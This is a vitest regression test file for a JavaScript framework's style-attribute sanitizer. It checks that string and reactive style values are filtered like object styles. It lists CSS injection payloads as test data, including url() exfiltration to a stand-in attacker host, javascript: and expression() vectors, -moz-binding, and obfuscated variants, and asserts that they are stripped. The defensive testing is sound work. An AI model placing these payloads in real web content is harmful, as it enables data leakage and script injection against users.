import { afterEach, describe, expect, it } from "vitest";
import { div } from "../src/core/rendering/html";
import { signal } from "../src/core/signals/signal";
import { bindAttribute } from "../src/reactivity/bindAttribute";
import { sanitizeAttributeString, sanitizeStyleAttribute } from "../src/utils/sanitize";

// ---------------------------------------------------------------------------
// Equivalent style authoring forms get equivalent security policy.
//
// THE INVARIANT UNDER TEST:
//
//   style: { background: dangerous }     and     style: "background: dangerous"
//
// express the same intent and must be sanitized the same way. `style` being an
// allowed attribute NAME never made an arbitrary style VALUE trusted.
//
// Regression origin: object-valued style ran each property through
// `sanitizeCSSValue`, while the string and reactive-string forms went straight
// to `setAttribute("style", raw)`. The string form was therefore a silent
// escape hatch out of the CSS policy — `url()` exfiltration, legacy
// `expression()`/`behavior:`/`-moz-binding`, `@import`.
//
// NOTE ON TEST DESIGN: payloads use `url(https://…)`, which the DOM keeps, so
// the assertions prove SibuJS did the filtering. Relying on a payload the
// engine itself discards would make these tests pass vacuously.
// ---------------------------------------------------------------------------

const EXFIL = "https://attacker.example/?leak=1";

let host: HTMLElement | null = null;
afterEach(() => {
  host?.remove();
  host = null;
});

describe("static string style is sanitized like object style", () => {
  it("drops a dangerous declaration and keeps the safe one", () => {
    const el = div({ style: `color: red; background: url(${EXFIL})` }) as HTMLElement;
    const style = el.getAttribute("style") ?? "";

    expect(style).not.toContain("url(");
    expect(style).not.toContain("attacker.example");
    expect(style).toContain("red");
  });

  it("matches the object form's outcome for the same intent", () => {
    const fromString = div({ style: `color: red; background: url(${EXFIL})` }) as HTMLElement;
    const fromObject = div({ style: { color: "red", background: `url(${EXFIL})` } }) as HTMLElement;

    const s = fromString.getAttribute("style") ?? "";
    const o = fromObject.getAttribute("style") ?? "";
    // Both keep the safe declaration and drop the dangerous one. Exact
    // serialization differs (`color: red` vs `color: red;`), so compare policy.
    expect(s.includes("url(")).toBe(o.includes("url("));
    expect(s).toContain("red");
    expect(o).toContain("red");
  });

  it("blocks the legacy CSS vectors", () => {
    const payloads = [
      `background: url(${EXFIL})`,
      "background-image: url(javascript:alert(1))",
      "width: expression(alert(1))",
      "behavior: url(x.htc)",
      "-moz-binding: url(https://attacker.example/x.xml)",
      "background: image-set(url(https://attacker.example/x.png) 1x)",
      "filter: progid:DXImageTransform.Microsoft.gradient()",
    ];
    for (const payload of payloads) {
      const el = div({ style: payload }) as HTMLElement;
      const style = (el.getAttribute("style") ?? "").toLowerCase();
      expect(style, payload).not.toContain("url(");
      expect(style, payload).not.toContain("expression(");
      expect(style, payload).not.toContain("attacker.example");
      expect(style, payload).not.toContain("progid");
      expect(style, payload).not.toContain("-moz-binding");
    }
  });

  it("blocks escape- and case-obfuscated forms", () => {
    for (const payload of ["background: URL( https://attacker.example/x.png )", "width: ex\\70 ression(alert(1))"]) {
      const el = div({ style: payload }) as HTMLElement;
      const style = (el.getAttribute("style") ?? "").toLowerCase();
      expect(style, payload).not.toContain("attacker.example");
      expect(style, payload).not.toContain("expression(");
    }
  });
});

describe("reactive string style is sanitized on every update", () => {
  it("never installs a dangerous update, and stays reactive", () => {
    const [style, setStyle] = signal("color: red");
    const el = div({ style }) as HTMLElement;
    host = document.createElement("div");
    document.body.appendChild(host);
    host.appendChild(el);

    expect(el.getAttribute("style")).toContain("red");

    setStyle(`background: url(${EXFIL})`);
    const after = el.getAttribute("style") ?? "";
    expect(after).not.toContain("url(");
    expect(after).not.toContain("attacker.example");

    // Reactivity survives the sanitizer.
    setStyle("color: blue");
    expect(el.getAttribute("style")).toContain("blue");
  });
});

describe("generic attribute writers share the policy", () => {
  it("bindAttribute('style', …) is sanitized", () => {
    const el = document.createElement("div");
    const [style, setStyle] = signal("color: red");
    const stop = bindAttribute(el, "style", style);

    expect(el.getAttribute("style")).toContain("red");
    setStyle(`background: url(${EXFIL})`);
    expect(el.getAttribute("style") ?? "").not.toContain("attacker.example");

    stop();
  });

  it("sanitizeAttributeString routes style through the declaration-list policy", () => {
    expect(sanitizeAttributeString("style", `background: url(${EXFIL})`)).not.toContain("attacker.example");
    expect(sanitizeAttributeString("STYLE", `background: url(${EXFIL})`)).not.toContain("attacker.example");
    expect(sanitizeAttributeString("style", "color: red")).toContain("red");
  });
});

describe("valid CSS survives", () => {
  it("keeps ordinary declarations intact", () => {
    const el = div({
      style: "color: red; display: flex; margin: 10px; opacity: 0.5; transform: translateX(10px)",
    }) as HTMLElement;
    const style = el.getAttribute("style") ?? "";

    for (const fragment of ["red", "flex", "10px", "0.5", "translateX(10px)"]) {
      expect(style, fragment).toContain(fragment);
    }
  });

  it("preserves custom properties and !important", () => {
    const out = sanitizeStyleAttribute("--brand: #fff; color: red !important");
    expect(out).toContain("--brand");
    expect(out).toContain("#fff");
    expect(out).toContain("!important");
  });

  it("does not corrupt declarations containing semicolons inside quotes", () => {
    // A naive split(";") would shred these.
    const out = sanitizeStyleAttribute("content: 'a;b'; color: green");
    expect(out).toContain("a;b");
    expect(out).toContain("green");
  });

  it("returns empty for empty input", () => {
    expect(sanitizeStyleAttribute("")).toBe("");
    expect(sanitizeStyleAttribute("   ")).toBe("");
  });
});
